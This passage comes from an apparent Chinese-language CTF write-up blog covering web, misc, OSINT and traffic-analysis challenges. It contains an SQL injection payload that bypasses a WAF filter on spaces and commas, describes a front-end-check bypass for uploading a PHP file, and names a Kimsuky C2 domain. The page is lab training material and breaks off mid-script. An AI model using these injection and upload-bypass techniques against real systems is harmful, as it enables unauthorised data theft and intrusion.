+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://eci-2zefcob15uoej7l94h9d.cloudeci1.ichunqiu.com:5000/login&#39;</span>
+</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: user_agent
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;Doro&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;password&#39;</span>: <span style="color:#e6db74">&#39;Doro_nJlPVs_@123&#39;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>header, data<span style="color:#f92672">=</span>args)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start_challenge</span>(session):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://eci-2zefcob15uoej7l94h9d.cloudeci1.ichunqiu.com:5000/start_challenge&#39;</span>
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: user_agent
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>header)
+</span></span><span style="display:flex;"><span>    j <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> str(j[<span style="color:#e6db74">&#39;expression&#39;</span>])
+</span></span><span style="display:flex;"><span>    eva <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>lstrip(<span style="color:#e6db74">&#39;token = &#39;</span>)
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> eval(eva)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">verify_token</span>(session, result):
+</span></span><span style="display:flex;"><span>    url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://eci-2zefcob15uoej7l94h9d.cloudeci1.ichunqiu.com:5000/verify_token&#39;</span>
+</span></span><span style="display:flex;"><span>    header <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: user_agent
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;token&#39;</span>: result
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(url, headers<span style="color:#f92672">=</span>header, json<span style="color:#f92672">=</span>args)
+</span></span><span style="display:flex;"><span>    print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> expr()
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> start_challenge(session)
+</span></span><span style="display:flex;"><span>verify_token(session, res)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>
+    <img src="../imgs/image-20251012143929588.png" alt="image-20251012143929588"  loading="lazy" /></p>
+<h3>白帽小K的故事（1）<span class="hx:absolute hx:-mt-20" id="白帽小k的故事1"></span>
+    <a href="#%e7%99%bd%e5%b8%bd%e5%b0%8fk%e7%9a%84%e6%95%85%e4%ba%8b1" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>
+    <img src="../imgs/image-20251006132109673.png" alt="image-20251006132109673"  loading="lazy" /></p>
+<p>走进去发现文件上传点，上传php试试，明显的前端校验，BP抓包改</p>
+<p>
+    <img src="../imgs/image-20251006132402274.png" alt="image-20251006132402274"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20251006132638862.png" alt="image-20251006132638862"  loading="lazy" /></p>
+<p>上传成功</p>
+<p>
+    <img src="../imgs/image-20251006134640667.png" alt="image-20251006134640667"  loading="lazy" /></p>
+<p>测试一下</p>
+<p>
+    <img src="../imgs/image-20251006134732273.png" alt="image-20251006134732273"  loading="lazy" /></p>
+<p>怀疑存在文件包含漏洞</p>
+<p>
+    <img src="../imgs/image-20251006134621536.png" alt=""  loading="lazy" /></p>
+<p>去找flag</p>
+<p>
+    <img src="../imgs/image-20251006134854474.png" alt="image-20251006134854474"  loading="lazy" /></p>
+<h3>小E的管理系统<span class="hx:absolute hx:-mt-20" id="小e的管理系统"></span>
+    <a href="#%e5%b0%8fe%e7%9a%84%e7%ae%a1%e7%90%86%e7%b3%bb%e7%bb%9f" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>发现sql注入，注入点id，发现有防火墙，进行fuzz测试，看看那些被过滤了，那些没有过滤，这个status code为500都是没有被过滤的</p>
+<p>
+    <img src="../imgs/image-20251006185040849.png" alt="image-20251006185040849"  loading="lazy" /></p>
+<p>接下来测试注入是字符型还是数字型</p>
+<p>
+    <img src="../imgs/image-20251012144443487.png" alt="image-20251012144443487"  loading="lazy" /></p>
+<p>测试id =1 , 2 , 2-1</p>
+<p>
+    <img src="../imgs/image-20251012144511881.png" alt="image-20251012144511881"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20251012144522604.png" alt="image-20251012144522604"  loading="lazy" /></p>
+<p>很明显2-1生效了说明是数字型注入，空格被过滤可以试试%0a,%09等等尝试能否绕过</p>
+<p>测试字段列数</p>
+<p>
+    <img src="../imgs/image-20251012145042268.png" alt="image-20251012145042268"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20251012145106853.png" alt="image-20251012145106853"  loading="lazy" /></p>
+<p>经过测试，发现有5列，接下来尝试union注入，发现逗号被过滤，使用下面方法2绕过</p>
+<p>
+    <img src="../imgs/image-20251012150219469.png" alt="image-20251012150219469"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20251012150748097.png" alt="image-20251012150748097"  loading="lazy" /></p>
+<p>查询 SQLite 数据库中所有的表名</p>
+<p>
+    <img src="../imgs/image-20251012151204803.png" alt="image-20251012151204803"  loading="lazy" /></p>
+<p>获取表结构，这里从 sqlite_master 表中读取 sql 字段</p>
+<p>
+    <img src="../imgs/image-20251012150913135.png" alt="image-20251012150913135"  loading="lazy" /></p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>CREATE TABLE node_status (
+</span></span><span style="display:flex;"><span>    node_id INTEGER PRIMARY KEY,
+</span></span><span style="display:flex;"><span>    cpu_usage VARCHAR(10),
+</span></span><span style="display:flex;"><span>    ram_usage VARCHAR(10),
+</span></span><span style="display:flex;"><span>    status VARCHAR(15) CHECK(status IN (&#39;Online&#39;,&#39;Offline&#39;,&#39;Maintenance&#39;)),
+</span></span><span style="display:flex;"><span>    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP
+</span></span><span style="display:flex;"><span>    ),
+</span></span><span style="display:flex;"><span>CREATE TABLE sys_config (
+</span></span><span style="display:flex;"><span>    id INTEGER PRIMARY KEY AUTOINCREMENT,
+</span></span><span style="display:flex;"><span>    config_key VARCHAR(50) UNIQUE,
+</span></span><span style="display:flex;"><span>    config_value TEXT
+</span></span><span style="display:flex;"><span>),
+</span></span><span style="display:flex;"><span>CREATE TABLE sqlite_sequence(name,seq)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>看 sys_config 表，有三个字段：id ,config_key,config_value，这里我们去看后两个字段的值</p>
+<p>
+    <img src="../imgs/image-20251012151754654.png" alt="image-20251012151754654"  loading="lazy" /></p>
+<p>最后的payload为</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><pre><code>1%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin(select%0a2)b%0ajoin(select%0a3)c%0ajoin(select%0agroup_concat(config_key)%0afrom%0asys_config)d%0ajoin(select%0agroup_concat(config_value)%0afrom%0asys_config)e</code></pre></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="复制代码"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h2>Misc<span class="hx:absolute hx:-mt-20" id="misc-1"></span>
+    <a href="#misc-1" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>美妙的音乐<span class="hx:absolute hx:-mt-20" id="美妙的音乐"></span>
+    <a href="#%e7%be%8e%e5%a6%99%e7%9a%84%e9%9f%b3%e4%b9%90" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>用工具打开就能看见flag</p>
+<p>
+    <img src="../imgs/image-20251007210122751.png" alt="image-20251007210122751"  loading="lazy" /></p>
+<p>flag{thi5_1S_m1Di_5tEG0}</p>
+<h3>OSINT-威胁情报<span class="hx:absolute hx:-mt-20" id="osint-威胁情报"></span>
+    <a href="#osint-%e5%a8%81%e8%83%81%e6%83%85%e6%8a%a5" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>给了一个hash值，直接微步</p>
+<p>hash:2c796053053a571e9f913fd5bae3bb45e27a9f510eace944af4b331e802a4ba0</p>
+<p>
+    <img src="../imgs/image-20251007212011647.png" alt="image-20251007212011647"  loading="lazy" /></p>
+<p>Kimsuky apt组织</p>
+<p>
+    <img src="../imgs/image-20251007212224529.png" alt="image-20251007212224529"  loading="lazy" /></p>
+<p>年-月-日 2021-03-31</p>
+<p>
+    <img src="../imgs/image-20251007214255534.png" alt="image-20251007214255534"  loading="lazy" /></p>
+<p>c2域名alps.travelmountain.ml</p>
+<p>flag{kimsuky_alps.travelmountain.ml_2021-03-31}</p>
+<h3>日志分析-不敬者的闯入<span class="hx:absolute hx:-mt-20" id="日志分析-不敬者的闯入"></span>
+    <a href="#%e6%97%a5%e5%bf%97%e5%88%86%e6%9e%90-%e4%b8%8d%e6%95%ac%e8%80%85%e7%9a%84%e9%97%af%e5%85%a5" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>审计日志，发现这条路径，访问看看</p>
+<p>
+    <img src="../imgs/image-20251007215244854.png" alt="image-20251007215244854"  loading="lazy" /></p>
+<p>
+    <img src="../imgs/image-20251007215442680.png" alt="image-20251007215442680"  loading="lazy" /></p>
+<h3>星期四的狂想<span class="hx:absolute hx:-mt-20" id="星期四的狂想"></span>
+    <a href="#%e6%98%9f%e6%9c%9f%e5%9b%9b%e7%9a%84%e7%8b%82%e6%83%b3" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>流量分析，先搜索flag，跟踪HTTP流，发现隐藏flag的地方，最后生成为Cookie，再往后面找找</p>
+<p>
+    <img src="../imgs/image-20251007222610959.png" alt="image-20251007222610959"  loading="lazy" /></p>
+<p>找到了R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ==</p>
+<p>需要解密</p>
+<p>
+    <img src="../imgs/image-20251007222829871.png" alt="image-20251007222829871"  loading="lazy" /></p>
+<p>写个解密脚本</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$encrypted <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>(<span style="color:#e6db74">&#34;R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ==&#34;</span>);
+</span></span><span style="display:flex;"><span>$chunks <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_split</span>($encrypted, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$possible_flags <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($chunks <span style="color:#66d9ef">as</span> $chunk) {
+</span></span><span style="display:flex;"><span>    $new_possibles <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($possible_flags <span style="color:#66d9ef">as</span> $base) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 可能性1: 这一块原为 ROT13
+</span></span></span><span style="display:flex;"><span>        $rot <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_rot13</span>($chunk);
+</span></span><span style="display:flex;"><span>        $new_possibles[] <span style="color:#f92672">=</span> $base <span style="color:#f92672">.</span> $rot;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 可能性2: 这一块原为反转
+</span></span></span><span style="display:flex;"><span>        $rev <span style="color:#f92672">=</span> <span style="color:#a6e22e">strrev</span>($chunk);
+</span></span><span style="display:flex;"><span>        $new_possibles[] <span style="color:#f92672">=</span> $base <span style="color:#f92672">.</span> $rev;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    $possible_flags <span style="color:#f92672">=</span> $new_possibles;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 过滤函数：检查是否为有效的Base64编码结果
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isValidBase64Result</span>($str) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Base64编码只包含这些字符
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^[A-Za-z0-9+\/]+={0,2}$/&#39;</span>, $str);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 过滤函数：检查Base64解码后是否为可打印文本
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isPrintableText</span>($str) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 检查是否包含不可打印字符（除了换行符和空格）
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[^\x20-\x7E\n\r\t]/&#39;</span>, $str)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 检查是否有一定比例的可读字符（字母、数字、常见标点）
+</span></span></span><span style="display:flex;"><span>    $readableCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    $total <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($str);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($total <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $total; $i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        $char <span style="color:#f92672">=</span> $str[$i];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ctype_alnum</span>($char) <span style="color:#f92672">||</span> <span style="color:#a6e22e">strpos</span>(<span style="color:#e6db74">&#39; {}[]()-_=+.,;:!?/&#39;</span>, $char) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>            $readableCount<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 至少70%的字符应该是可读的
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ($readableCount <span style="color:#f92672">/</span> $total) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0.7</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 更严格的flag格式检查
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">looksLikeFlag</span>($str) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 常见的flag格式
+</span></span></span><span style="display:flex;"><span>    $flagPatterns <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/flag\{[^}]+\}/&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/FLAG\{[^}]+\}/&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/ctf\{[^}]+\}/&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/CTF\{[^}]+\}/&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;/[a-zA-Z0-9_]{10,}/&#39;</span> <span style="color:#75715e">// 或者长字符串
+</span></span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($flagPatterns <span style="color:#66d9ef">as</span> $pattern) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>($pattern, $str)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;正在分析 &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">count</span>($possible_flags) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; 种可能性...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$validResults <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($possible_flags <span style="color:#66d9ef">as</span> $candidate) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 首先检查候选字符串本身是否是有效的Base64
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isValidBase64Result</span>($candidate)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $decoded <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($candidate, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($decoded <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 检查解码后是否为可打印文本
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isPrintableText</span>($decoded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 检查是否包含flag特征
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">looksLikeFlag</span>($decoded)) {
+</span></span><span style="display:flex;"><span>        $validResults[] <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;base64&#39;</span> <span style="color:#f92672">=&gt;</span> $candidate,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;decoded&#39;</span> <span style="color:#f92672">=&gt;</span> $decoded,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;length&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">strlen</span>($decoded)
+</span></span><span style="display:flex;"><span>        ];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 按长度排序，flag通常不会太短
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">usort</span>($validResults, <span style="color:#66d9ef">function</span>($a, $b) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $b[<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">-</span> $a[<span style="color:#e6db74">&#39;length&#39;</span>];
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">有效结果:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">foreach</span> ($validResults <span style="color:#66d9ef">as</span> $result) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Base64: &#34;</span> <span style="color:#f92672">.</span> $result[<span style="color:#e6db74">&#39;base64&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;解码: &#34;</span> <span style="color:#f92672">.</span> $result[<span style="color:#e6db74">&#39;decoded&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;长度: &#34;</span> <span style="color:#f92672">.</span> $result[<span style="color:#e6db74">&#39;length&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; 字符</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;---</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 如果没有找到flag格式，显示所有可打印结果
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($validResults)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">未找到标准flag格式，显示所有可打印结果:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    $allPrintable <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($possible_flags <span style="color:#66d9ef">as</span> $candidate) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isValidBase64Result</span>($candidate)) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $decoded <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($candidate, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($decoded <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) <span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isPrintableText</span>($decoded)) {
+</span></span><span style="display:flex;"><span>            $allPrintable[] <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;base64&#39;</span> <span style="color:#f92672">=&gt;</span> $candidate,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;decoded&#39;</span> <span style="color:#f92672">=&gt;</span> $decoded
+</span></span><span style="display:flex;"><span>            ];
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($allPrintable <span style="color:#66d9ef">as</span> $result) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Base64: &#34;</span> <span style="color:#f92672">.</span> $result[<span style="color:#e6db74">&#39;base64&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
